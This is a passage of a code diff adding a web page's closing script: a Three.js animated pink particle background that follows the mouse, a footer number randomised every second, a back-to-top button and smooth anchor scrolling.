+        const renderer = new THREE.WebGLRenderer({
+            canvas,
+            antialias: true,
+            alpha: true
+        });
+        renderer.setSize(window.innerWidth, window.innerHeight);
+        renderer.setPixelRatio(window.devicePixelRatio);
+
+        const scene = new THREE.Scene();
+        const camera = new THREE.PerspectiveCamera(75, window.innerWidth / window.innerHeight, 0.1, 1000);
+        camera.position.z = 5;
+
+        const particlesGeometry = new THREE.BufferGeometry();
+        const particlesCount = 2000;
+        
+        const positions = new Float32Array(particlesCount * 3);
+        const colors = new Float32Array(particlesCount * 3);
+        const sizes = new Float32Array(particlesCount);
+        
+        for (let i = 0; i < particlesCount * 3; i += 3) {
+            positions[i] = (Math.random() - 0.5) * 20;
+            positions[i + 1] = (Math.random() - 0.5) * 20;
+            positions[i + 2] = (Math.random() - 0.5) * 20;
+            
+            colors[i] = Math.random() * 0.5 + 0.5;
+            colors[i + 1] = Math.random() * 0.2;
+            colors[i + 2] = Math.random() * 0.5 + 0.5;
+            
+            sizes[i/3] = Math.random() * 0.5 + 0.5;
+        }
+        
+        particlesGeometry.setAttribute('position', new THREE.BufferAttribute(positions, 3));
+        particlesGeometry.setAttribute('color', new THREE.BufferAttribute(colors, 3));
+        particlesGeometry.setAttribute('size', new THREE.BufferAttribute(sizes, 1));
+        
+        const particlesMaterial = new THREE.PointsMaterial({
+            size: 0.1,
+            vertexColors: true,
+            transparent: true,
+            opacity: 0.8,
+            sizeAttenuation: true,
+            map: createCircleTexture()
+        });
+        
+        function createCircleTexture() {
+            const canvas = document.createElement('canvas');
+            canvas.width = 64;
+            canvas.height = 64;
+            
+            const context = canvas.getContext('2d');
+            context.clearRect(0, 0, canvas.width, canvas.height);
+            
+            const centerX = canvas.width / 2;
+            const centerY = canvas.height / 2;
+            const radius = canvas.width / 2.5;
+            
+            context.beginPath();
+            context.arc(centerX, centerY, radius, 0, 2 * Math.PI, false);
+            
+            const gradient = context.createRadialGradient(centerX, centerY, 0, centerX, centerY, radius);
+            gradient.addColorStop(0, 'rgba(255, 255, 255, 1)');
+            gradient.addColorStop(0.5, 'rgba(255, 105, 180, 0.8)');
+            gradient.addColorStop(1, 'rgba(255, 105, 180, 0)');
+            
+            context.fillStyle = gradient;
+            context.fill();
+            
+            const texture = new THREE.Texture(canvas);
+            texture.needsUpdate = true;
+            return texture;
+        }
+        
+        const particles = new THREE.Points(particlesGeometry, particlesMaterial);
+        scene.add(particles);
+
+        let mouseX = 0;
+        let mouseY = 0;
+        let targetX = 0;
+        let targetY = 0;
+        
+        document.addEventListener('mousemove', (event) => {
+            mouseX = (event.clientX / window.innerWidth) * 2 - 1;
+            mouseY = -(event.clientY / window.innerHeight) * 2 + 1;
+        });
+
+        function animate() {
+            requestAnimationFrame(animate);
+            
+            targetX = mouseX * 0.2;
+            targetY = mouseY * 0.2;
+            
+            particles.rotation.x += 0.0005;
+            particles.rotation.y += 0.001;
+            
+            particles.rotation.y += (targetX - particles.rotation.y) * 0.05;
+            particles.rotation.x += (targetY - particles.rotation.x) * 0.05;
+            
+            const positions = particles.geometry.attributes.position.array;
+            for (let i = 0; i < positions.length; i += 3) {
+                positions[i + 1] += Math.sin(Date.now() * 0.001 + positions[i] * 0.1) * 0.002;
+            }
+            particles.geometry.attributes.position.needsUpdate = true;
+            
+            renderer.render(scene, camera);
+        }
+
+        window.addEventListener('resize', () => {
+            camera.aspect = window.innerWidth / window.innerHeight;
+            camera.updateProjectionMatrix();
+            renderer.setSize(window.innerWidth, window.innerHeight);
+        });
+
+        // Número aleatório no rodapé
+        setInterval(() => {
+            document.getElementById('random-numbers').textContent = Math.floor(Math.random() * 100000000).toString();
+        }, 1000);
+
+        
+        const backToTopButton = document.getElementById('backToTop');
+        
+        window.addEventListener('scroll', () => {
+            if (window.pageYOffset > 300) {
+                backToTopButton.classList.add('visible');
+            } else {
+                backToTopButton.classList.remove('visible');
+            }
+        });
+        
+        backToTopButton.addEventListener('click', (e) => {
+            e.preventDefault();
+            window.scrollTo({ top: 0, behavior: 'smooth' });
+        });
+        
+        
+        document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+            anchor.addEventListener('click', function (e) {
+                if (this.getAttribute('href') !== '#') {
+                    e.preventDefault();
+                    document.querySelector(this.getAttribute('href')).scrollIntoView({
+                        behavior: 'smooth'
+                    });
+                }
+            });
+        });
+
+        animate();
+    </script>
+</body>
+</html>
